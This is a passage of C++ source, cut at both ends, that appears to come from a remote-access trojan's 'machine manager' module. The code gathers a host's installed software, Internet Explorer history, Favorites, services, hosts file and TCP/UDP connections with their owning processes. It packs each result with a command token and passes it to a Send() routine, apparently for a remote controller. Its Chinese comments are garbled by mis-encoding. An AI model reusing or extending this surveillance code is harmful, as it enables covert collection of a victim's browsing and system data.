					memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) * sizeof(TCHAR) + 2);
					dwOffset += lstrlen(regPublisher) * sizeof(TCHAR) + 2;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) * sizeof(TCHAR) + 2);
					dwOffset += lstrlen(regDisplayVersion) * sizeof(TCHAR) + 2;

					memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) * sizeof(TCHAR) + 2);
					dwOffset += lstrlen(regInstallDate) * sizeof(TCHAR) + 2;

					memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) * sizeof(TCHAR) + 2);
					dwOffset += lstrlen(regUninstallString) * sizeof(TCHAR) + 2;
				}
			}
		}
	}
	else
	{
		return FALSE; //�򿪼�ʧ��
	}

	RegCloseKey(hKey);


	if (Is64BitOS())
	{
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
			NULL, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
			{
				for (int i = 0; i < (int)dwRegNum; i++)
				{
					DWORD dwRegSize = MAX_LEG;
					RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
					DWORD dwType;
					HKEY hSubKey;
					if (RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
					{
						dwRegSize = MAX_LEG;
						memset(regDisplayName, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, _T("DisplayName"), 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regBufferValue, 0, MAX_LEG);
						// ȡParentKeyName��ֵ,�ж��Ƿ��ǲ�����Ϣ, �ǲ�����Ϣ��ֵΪ"OperatingSystem"
						RegQueryValueEx(hSubKey, _T("ParentKeyName"), 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
						if (lstrlen(regDisplayName) == 0 || lstrcmp(regBufferValue, _T("OperatingSystem")) == 0) //�ж��Ƿ��ǲ�����Ϣ 
						{
							continue;
						}

						dwRegSize = MAX_LEG;
						memset(regPublisher, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, _T("Publisher"), 0, &dwType, (LPBYTE)regPublisher, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regDisplayVersion, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, _T("DisplayVersion"), 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regInstallDate, 0, MAX_LEG);
						// �ж��Ƿ�����ע����л�ȡ����װʱ��, ��ȡ�����ʱ��
						if (RegQueryValueEx(hSubKey, _T("InstallDate"), 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS)
						{
							TCHAR Year[5], Month[5], Day[5];
							lstrcpyn(Year, regInstallDate, 5);
							lstrcpyn(Month, regInstallDate + 4, 3);
							lstrcpyn(Day, regInstallDate + 4 + 2, 3);
							wsprintf(regInstallDate, _T("%s/%s/%s"), Year, Month, Day);
						}
						else
						{
							FILETIME fileLastTime;
							RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
								NULL, NULL, NULL, &fileLastTime);
							SYSTEMTIME sTime, stLocal;
							FileTimeToSystemTime(&fileLastTime, &sTime);
							SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
							wsprintf(regInstallDate, _T("%d/%02d/%02d"), stLocal.wYear, stLocal.wMonth, stLocal.wDay);
						}

						dwRegSize = MAX_LEG;
						memset(regUninstallString, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, _T("UninstallString"), 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);

						// ������̫С�������·�����
						dwLength = lstrlen(regDisplayName) * sizeof(TCHAR) + lstrlen(regPublisher) * sizeof(TCHAR) + lstrlen(regDisplayVersion) * sizeof(TCHAR) + lstrlen(regInstallDate) * sizeof(TCHAR) + lstrlen(regUninstallString) * sizeof(TCHAR) + 11;
						if (LocalSize(lpBuffer) < (dwOffset + dwLength))
							lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

						memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) * sizeof(TCHAR) + 2);
						dwOffset += lstrlen(regDisplayName) * sizeof(TCHAR) + 2;

						memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) * sizeof(TCHAR) + 2);
						dwOffset += lstrlen(regPublisher) * sizeof(TCHAR) + 2;

						memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) * sizeof(TCHAR) + 2);
						dwOffset += lstrlen(regDisplayVersion) * sizeof(TCHAR) + 2;

						memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) * sizeof(TCHAR) + 2);
						dwOffset += lstrlen(regInstallDate) * sizeof(TCHAR) + 2;

						memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) * sizeof(TCHAR) + 2);
						dwOffset += lstrlen(regUninstallString) * sizeof(TCHAR) + 2;
					}
				}
			}
		}
		else
			return FALSE; //�򿪼�ʧ��
		RegCloseKey(hKey);
	}


	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpBuffer;
}


void CMachineManager::SendIEHistoryList()
{
	LPBYTE	lpBuffer = getIEHistoryList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (UINT)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}



LPBYTE CMachineManager::getIEHistoryList()
{
	HRESULT   hr;
	IUrlHistoryStg2* puhs;
	IEnumSTATURL* pesu;
	STATURL   su;
	ULONG   celt = 0;
	//  _bstr_t   bstr; 
	CoInitialize(NULL);
	hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg, (LPVOID*)&puhs);
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD	dwLength = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpBuffer[0] = TOKEN_MACHINE_HTML;
	Browsinghistory m_Browsinghistory;
	dwLength = sizeof(Browsinghistory);
	if (SUCCEEDED(hr))
	{
		hr = puhs->EnumUrls(&pesu);
		if (SUCCEEDED(hr))
		{
			while (SUCCEEDED(pesu->Next(1, &su, &celt)) && celt > 0)
			{
				ZeroMemory(&m_Browsinghistory, sizeof(Browsinghistory));
				if ((su.pwcsUrl != NULL) && (lstrlen(su.pwcsUrl) < 1024))
					memcpy(m_Browsinghistory.strUrl, su.pwcsUrl, lstrlen(su.pwcsUrl) * sizeof(TCHAR));
				else
					wsprintf(m_Browsinghistory.strUrl, _T("---"));
				if ((su.pwcsTitle != NULL) && (lstrlen(su.pwcsTitle) < 1024))
					memcpy(m_Browsinghistory.strTitle, su.pwcsTitle, lstrlen(su.pwcsTitle) * sizeof(TCHAR));
				else
					wsprintf(m_Browsinghistory.strTitle, _T("---"));
				SYSTEMTIME  st;
				if (&su.ftLastVisited != NULL)
				{
					FileTimeToSystemTime(&su.ftLastVisited, &st);
					wsprintf(m_Browsinghistory.strTime, _T("%d-%d-%d %d:%d:%d"), st.wYear, st.wMonth, st.wDay, st.wHour, st.wSecond, st.wMinute);
				}
				else
				{
					wsprintf(m_Browsinghistory.strTime, _T("---"));
				}
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, &m_Browsinghistory, sizeof(Browsinghistory));
				dwOffset += sizeof(Browsinghistory);
			}
			puhs->Release();
		}
	}
	CoUninitialize();
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	return lpBuffer;
}

void CMachineManager::SendFavoritesUrlList()
{
	LPBYTE	lpBuffer = getFavoritesUrlList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (int)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}



void CMachineManager::FindFavoritesUrl(TCHAR* searchfilename)
{
	TCHAR favpath[MAX_PATH] = { 0 };
	TCHAR tmpPath[MAX_PATH] = { 0 };
	DWORD	dwFULength = 0;

	lstrcat(favpath, searchfilename);
	lstrcat(favpath, _T("\\*.*"));

	WIN32_FIND_DATA fd;
	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));

	HANDLE hFind = FindFirstFile(favpath, &fd); // �ļ���׺���� url
	do
	{
		if (fd.cFileName[0] != _T('.'))
		{
			lstrcpy(tmpPath, searchfilename);
			lstrcat(tmpPath, _T("\\"));
			lstrcat(tmpPath, fd.cFileName);
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{

				FindFavoritesUrl(tmpPath);
			}
			else if (_tcsstr(fd.cFileName, _T(".url")))
			{

				TCHAR buf[MAX_PATH] = { 0 };
				::GetPrivateProfileString(_T("InternetShortcut"), _T("URL"), _T(""), buf, sizeof(buf), tmpPath);


				dwFULength = lstrlen(buf) * sizeof(TCHAR) + lstrlen(fd.cFileName) * sizeof(TCHAR) + 4;

				if (LocalSize(lpFUBuffer) < (dwFUOffset + dwFULength))
					lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, (dwFUOffset + dwFULength) + 1024, LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpFUBuffer + dwFUOffset, fd.cFileName, lstrlen(fd.cFileName) * sizeof(TCHAR) + 2);
				dwFUOffset += lstrlen(fd.cFileName) * sizeof(TCHAR) + 2;

				memcpy(lpFUBuffer + dwFUOffset, buf, lstrlen(buf) * sizeof(TCHAR) + 2);
				dwFUOffset += lstrlen(buf) * sizeof(TCHAR) + 2;

			}
		}
	} while (FindNextFile(hFind, &fd));
	FindClose(hFind);
}


LPBYTE CMachineManager::getFavoritesUrlList()
{
	TCHAR favpath[MAX_PATH] = { 0 };

	// ��ע����ȡ�ղؼ�����λ��
	HKEY hKEY;
	DWORD type = REG_SZ;
	LPCTSTR path = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders");
	DWORD cbData = 80;
	::RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_READ, &hKEY);
	::RegQueryValueEx(hKEY, _T("Favorites"), NULL, &type, (LPBYTE)favpath, &cbData);
	::RegCloseKey(hKEY);


	lpFUBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpFUBuffer[0] = TOKEN_MACHINE_FAVORITES;
	dwFUOffset = 1;

	FindFavoritesUrl(favpath);

	lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, dwFUOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpFUBuffer;
}

void CMachineManager::SendServicesList(DWORD dwScType)
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getServiceList(dwScType);
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (int)(LocalSize(lpBuffer)));
	LocalFree(lpBuffer);
}

LPBYTE CMachineManager::getServiceList(DWORD dwScType)
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	LPBYTE	 lpBuffer = NULL;
	DWORD	 dwOffset = 0;
	DWORD	 dwLength = 1024 * 8;
	TCHAR     strState[100], strStartType[100], lpDescription[1024];


	LPENUM_SERVICE_STATUS lpServices = NULL;
	SC_HANDLE sc = NULL;
	SC_HANDLE sh;
	dwServiceType = dwScType;//SERVICE_WIN32 ;//SERVICE_KERNEL_DRIVER;  

	DWORD size = 0;
	DWORD ret = 0;

	TCHAR* szInfo[1024 * 8];
	DWORD dwSize = 1024 * 8;

	sc = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	//��һ�ε������õ���Ҫ�����ڴ���
	EnumServicesStatus(sc, dwServiceType, SERVICE_STATE_ALL, lpServices, size, &size, &ret, NULL);
	//������Ҫ���ڴ�
	lpServices = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, size);
	EnumServicesStatus(sc, dwServiceType, SERVICE_STATE_ALL, lpServices, size, &size, &ret, NULL);


	// ����Buffer�ڴ�
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024 * sizeof(TCHAR));
	lpBuffer[0] = TOKEN_MACHINE_SERVICE_LIST;
	dwOffset = 1;

	for (DWORD i = 0; i < ret; i++)
	{
		dwSize = 1024 * 8;
		ZeroMemory(szInfo, dwSize);

		// ��ʾ��
//		puts(lpServices[i].lpDisplayName);

		sh = OpenService(sc, lpServices[i].lpServiceName, SERVICE_ALL_ACCESS);
		if (sh == NULL) //��ʧ��
			continue;

		QueryServiceConfig2(sh, SERVICE_CONFIG_DESCRIPTION, (LPBYTE)szInfo, dwSize, &dwSize);
		// ����
		memset(lpDescription, 0, sizeof(lpDescription));
		if (((LPSERVICE_DESCRIPTION)szInfo)->lpDescription != NULL)
			lstrcpy(lpDescription, ((LPSERVICE_DESCRIPTION)szInfo)->lpDescription);


		// ״̬
		memset(strState, 0, sizeof(strState));
		switch (lpServices[i].ServiceStatus.dwCurrentState)
		{
		case SERVICE_CONTINUE_PENDING:
			lstrcpy(strState, _T("Continue"));
			break;
		case SERVICE_PAUSE_PENDING:
			lstrcpy(strState, _T("Pausing"));
			break;
		case SERVICE_PAUSED:
			lstrcpy(strState, _T("Paused"));
			break;
		case SERVICE_RUNNING:
			lstrcpy(strState, _T("Running"));
			break;
		case SERVICE_START_PENDING:
			lstrcpy(strState, _T("Starting"));
			break;
		case SERVICE_STOP_PENDING:
			lstrcpy(strState, _T("Stopping"));
			break;
		case SERVICE_STOPPED:
			lstrcpy(strState, _T("Stopped"));
			break;
		default:
			lstrcpy(strState, _T("Erro"));
			break;
		}

		ZeroMemory(szInfo, dwSize);
		dwSize = 1024 * 8;
		if (!QueryServiceConfig(sh, (LPQUERY_SERVICE_CONFIG)szInfo, dwSize, &dwSize))
		{
			continue;
		}
		// ��������
		memset(strStartType, 0, sizeof(strStartType));
		switch (((LPQUERY_SERVICE_CONFIG)szInfo)->dwStartType)
		{
		case SERVICE_AUTO_START:
			lstrcpy(strStartType, _T("Auto Start"));
			break;
		case SERVICE_BOOT_START:
			lstrcpy(strStartType, _T("Boot Start"));
			break;
		case SERVICE_DEMAND_START:
			lstrcpy(strStartType, _T("Demand Start"));
			break;
		case SERVICE_DISABLED:
			lstrcpy(strStartType, _T("Disabled"));
			break;
		case SERVICE_SYSTEM_START:
			lstrcpy(strStartType, _T("System Start"));
			break;
		default:
			lstrcpy(strStartType, _T("Erro"));
			break;
		}


		// ����������˻���
//		puts(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName);


		// �Ƿ������潻��
		TCHAR* InterActive = _T("");
		if (((LPQUERY_SERVICE_CONFIG)szInfo)->dwServiceType >= SERVICE_INTERACTIVE_PROCESS)
			InterActive = _T("��");

		// ������
//		puts(lpServices[i].lpServiceName);

		// ·��
//		puts(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName);

//==========================================================================================
		// ������̫С�������·�����
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);


		// ��ʾ����
		memcpy(lpBuffer + dwOffset, lpServices[i].lpDisplayName, lstrlen(lpServices[i].lpDisplayName) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(lpServices[i].lpDisplayName) * sizeof(TCHAR) + sizeof(TCHAR);

		// ����
		memcpy(lpBuffer + dwOffset, lpDescription, lstrlen(lpDescription) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(lpDescription) * sizeof(TCHAR) + sizeof(TCHAR);

		// ״̬
		memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(strState) * sizeof(TCHAR) + sizeof(TCHAR);

		// ��������
		memcpy(lpBuffer + dwOffset, strStartType, lstrlen(strStartType) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(strStartType) * sizeof(TCHAR) + sizeof(TCHAR);

		// ��½���
		memcpy(lpBuffer + dwOffset, ((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName, lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName) * sizeof(TCHAR) + sizeof(TCHAR);

		// ���潻��
		memcpy(lpBuffer + dwOffset, InterActive, lstrlen(InterActive) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(InterActive) * sizeof(TCHAR) + sizeof(TCHAR);

		// ������
		memcpy(lpBuffer + dwOffset, lpServices[i].lpServiceName, lstrlen(lpServices[i].lpServiceName) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(lpServices[i].lpServiceName) * sizeof(TCHAR) + sizeof(TCHAR);

		// ��ִ���ļ�·��
		memcpy(lpBuffer + dwOffset, ((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName, lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName) * sizeof(TCHAR) + sizeof(TCHAR));
		dwOffset += lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName) * sizeof(TCHAR) + sizeof(TCHAR);

		// ����֪ͨ

		CloseServiceHandle(sh);
	}

	CloseServiceHandle(sc);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
	return lpBuffer;
}

void CMachineManager::SendHostsList()
{
	TCHAR szHostsFile[MAX_PATH] = { 0 };
	BOOL bIsWow64 = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwSize = 0, dwRead;
	LPBYTE lpBuffer = NULL;



	GetWindowsDirectory(szHostsFile, sizeof(szHostsFile));
	::IsWow64Process(::GetCurrentProcess(), &bIsWow64);
	if (bIsWow64)
		lstrcat(szHostsFile, _T("\\sysnative\\drivers\\etc\\hosts"));
	else
		lstrcat(szHostsFile, _T("\\system32\\drivers\\etc\\hosts"));

	SetFileAttributes(szHostsFile, FILE_ATTRIBUTE_NORMAL);
	hFile = CreateFile(szHostsFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	dwSize = GetFileSize(hFile, NULL);
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwSize + 2);
	if (!ReadFile(hFile, lpBuffer + 1, dwSize, &dwRead, NULL))
	{
		LocalFree(lpBuffer);
		CloseHandle(hFile);
		return;
	}
	CloseHandle(hFile);

	lpBuffer[0] = TOKEN_MACHINE_HOSTS;
	Send((LPBYTE)lpBuffer, (UINT)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}




LPBYTE CMachineManager::getNetStateList()
{
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_MACHINE_NETSTATE;
	DWORD	dwOffset = 1;
	DWORD	dwLength = 0;
	WCHAR* temp;
	// ������չ����ָ��
	PFNAllocateAndGetTcpExTableFromStack pAllocateAndGetTcpExTableFromStack;
	PFNAllocateAndGetUdpExTableFromStack pAllocateAndGetUdpExTableFromStack;

	// ��ȡ��չ��������ڵ�ַ
	HMODULE hModule = ::LoadLibrary(_T("iphlpapi.dll"));
	pAllocateAndGetTcpExTableFromStack =
		(PFNAllocateAndGetTcpExTableFromStack)::GetProcAddress(hModule,
			"AllocateAndGetTcpExTableFromStack");

	pAllocateAndGetUdpExTableFromStack =
		(PFNAllocateAndGetUdpExTableFromStack)::GetProcAddress(hModule,
			"AllocateAndGetUdpExTableFromStack");

	if (pAllocateAndGetTcpExTableFromStack != NULL || pAllocateAndGetUdpExTableFromStack != NULL)
	{
		// ������չ��������ȡTCP��չ���ӱ��UDP��չ������

		PMIB_TCPEXTABLE pTcpExTable;
		PMIB_UDPEXTABLE pUdpExTable;

		// pTcpExTable��pUdpExTable��ָ�Ļ������Զ�����չ�����ڽ��̶�������
		if (pAllocateAndGetTcpExTableFromStack(&pTcpExTable, TRUE, GetProcessHeap(), 2, 2) != 0)
		{
			return NULL;
		}
		if (pAllocateAndGetUdpExTableFromStack(&pUdpExTable, TRUE, GetProcessHeap(), 2, 2) != 0)
		{
			return NULL;
		}

		// ��ϵͳ�ڵ����н�����һ������
		HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{
			return NULL;
		}

		TCHAR    szLocalAddr[128];
		TCHAR    szRemoteAddr[128];
		TCHAR    szProcessName[128];
		in_addr inadLocal, inadRemote;
		TCHAR    strState[128];
		DWORD   dwRemotePort = 0;

		// ��ӡTCP��չ���ӱ���Ϣ
		for (UINT i = 0; i < pTcpExTable->dwNumEntries; ++i)
		{
			// ״̬
			switch (pTcpExTable->table[i].dwState)
			{
			case MIB_TCP_STATE_CLOSED:
				lstrcpy(strState, _T("�ѹر�"));
				break;
			case MIB_TCP_STATE_LISTEN:
				lstrcpy(strState, _T("����"));
				break;
			case MIB_TCP_STATE_SYN_SENT:
				lstrcpy(strState, _T("SYN_����"));
				break;
			case MIB_TCP_STATE_SYN_RCVD:
				lstrcpy(strState, _T("SYN_����"));
				break;
			case MIB_TCP_STATE_ESTAB:
				lstrcpy(strState, _T("����"));
				break;
			case MIB_TCP_STATE_FIN_WAIT1:
				lstrcpy(strState, _T("FIN_WAIT1"));
				break;
			case MIB_TCP_STATE_FIN_WAIT2:
				lstrcpy(strState, _T("FIN_WAIT2"));
				break;
			case MIB_TCP_STATE_CLOSE_WAIT:
				lstrcpy(strState, _T("CLOSE_WAIT"));
				break;
			case MIB_TCP_STATE_CLOSING:
				lstrcpy(strState, _T("���ڹر�"));
				break;
			case MIB_TCP_STATE_LAST_ACK:
				lstrcpy(strState, _T("LAST_ACK"));
				break;
			case MIB_TCP_STATE_TIME_WAIT:
				lstrcpy(strState, _T("TIME_WAIT"));
				break;
			case MIB_TCP_STATE_DELETE_TCB:
				lstrcpy(strState, _T("ɾ��"));
				break;
			default:
				break;
			}
			// ����IP��ַ
			inadLocal.s_addr = pTcpExTable->table[i].dwLocalAddr;

			// Զ�̶˿�
			if (lstrcmp(strState, _T("����")) != 0)
			{
				dwRemotePort = pTcpExTable->table[i].dwRemotePort;
			}
			else
				dwRemotePort = 0;

			// Զ��IP��ַ
			inadRemote.s_addr = pTcpExTable->table[i].dwRemoteAddr;

			 temp = char2wchar_t(inet_ntoa(inadLocal));
			wsprintf(szLocalAddr, _T("%s:%u"), temp,
				ntohs((unsigned short)(0x0000FFFF & pTcpExTable->table[i].dwLocalPort)));
			SAFE_DELETE_AR(temp);
			temp = char2wchar_t(inet_ntoa(inadRemote));
			wsprintf(szRemoteAddr, _T("%s:%u"), temp,
				ntohs((unsigned short)(0x0000FFFF & dwRemotePort)));
			SAFE_DELETE_AR(temp);
			// ��ӡ������ڵ���Ϣ
			TCHAR strProcessName[100] = { 0 };
			TCHAR* strType = _T("[TCP]");
			lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pTcpExTable->table[i].dwProcessId, szProcessName));

			dwLength = lstrlen(strProcessName) * sizeof(TCHAR) + sizeof(DWORD) + lstrlen(strType) * sizeof(TCHAR) + lstrlen(szLocalAddr) * sizeof(TCHAR) + lstrlen(szRemoteAddr) * sizeof(TCHAR) + lstrlen(strState) * sizeof(TCHAR) + 12;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strProcessName) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, &pTcpExTable->table[i].dwProcessId, sizeof(DWORD) + 2);
			dwOffset += sizeof(DWORD) + 2;

			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strType) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(szLocalAddr) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strState) * sizeof(TCHAR) + 2;
		}

		// ��ӡUDP��������Ϣ
		for (DWORD i = 0; i < pUdpExTable->dwNumEntries; ++i)
		{
			// ����IP��ַ
			inadLocal.s_addr = pUdpExTable->table[i].dwLocalAddr;
			temp = char2wchar_t(inet_ntoa(inadLocal));
			wsprintf(szLocalAddr, _T("%s:%u"), temp,
				ntohs((unsigned short)(0x0000FFFF & pUdpExTable->table[i].dwLocalPort)));
			SAFE_DELETE_AR(temp);
			// ��ӡ������ڵ���Ϣ
			TCHAR strProcessName[100] = { 0 };
			TCHAR* strType = _T("[UDP]");
			TCHAR* szRemoteAddr = _T("*.*.*.*:*");
			TCHAR* szUDPState = _T(" ");
			lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pUdpExTable->table[i].dwProcessId, szProcessName));

			dwLength = lstrlen(strProcessName) * sizeof(TCHAR) + sizeof(DWORD) + lstrlen(strType) * sizeof(TCHAR) + lstrlen(szLocalAddr) * sizeof(TCHAR) + lstrlen(szRemoteAddr) * sizeof(TCHAR) + lstrlen(szUDPState) * sizeof(TCHAR) + 12;

			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strProcessName) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, &pUdpExTable->table[i].dwProcessId, sizeof(DWORD) + 2);
			dwOffset += sizeof(DWORD) + 2;

			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strType) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(szLocalAddr) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, szUDPState, lstrlen(szUDPState) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(szUDPState) * sizeof(TCHAR) + 2;
		}
		::CloseHandle(hProcessSnap);
		::LocalFree(pTcpExTable);
		::LocalFree(pUdpExTable);
		::FreeLibrary(hModule);
	}
	else
	{
		TCHAR    szLocalAddr[128];
		TCHAR    szRemoteAddr[128];
		TCHAR    szProcessName[128];
		in_addr inadLocal, inadRemote;
		TCHAR    strState[128];
		DWORD   dwRemotePort = 0;

		PMIB_TCPEXTABLE_VISTA pTcpTable_Vista;
		_InternalGetTcpTable2 pGetTcpTable = (_InternalGetTcpTable2)GetProcAddress(hModule, "InternalGetTcpTable2");
		if (pGetTcpTable == NULL)
			return 0;

		if (pGetTcpTable(&pTcpTable_Vista, GetProcessHeap(), 1))
			return 0;

		// ��ϵͳ�ڵ����н�����һ������
		HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{
			return NULL;
		}

		for (UINT i = 0; i < pTcpTable_Vista->dwNumEntries; i++)
		{
			// ״̬
			switch (pTcpTable_Vista->table[i].dwState)
			{
			case MIB_TCP_STATE_CLOSED:
				lstrcpy(strState, _T("�ѹر�"));
				break;
			case MIB_TCP_STATE_LISTEN:
				lstrcpy(strState, _T("����"));
				break;
			case MIB_TCP_STATE_SYN_SENT:
				lstrcpy(strState, _T("SYN_����"));
				break;
			case MIB_TCP_STATE_SYN_RCVD:
				lstrcpy(strState, _T("SYN_����"));
				break;
			case MIB_TCP_STATE_ESTAB:
				lstrcpy(strState, _T("����"));
				break;
			case MIB_TCP_STATE_FIN_WAIT1:
				lstrcpy(strState, _T("FIN_WAIT1"));
				break;
			case MIB_TCP_STATE_FIN_WAIT2:
				lstrcpy(strState, _T("FIN_WAIT2"));
				break;
			case MIB_TCP_STATE_CLOSE_WAIT:
				lstrcpy(strState, _T("CLOSE_WAIT"));
				break;
			case MIB_TCP_STATE_CLOSING:
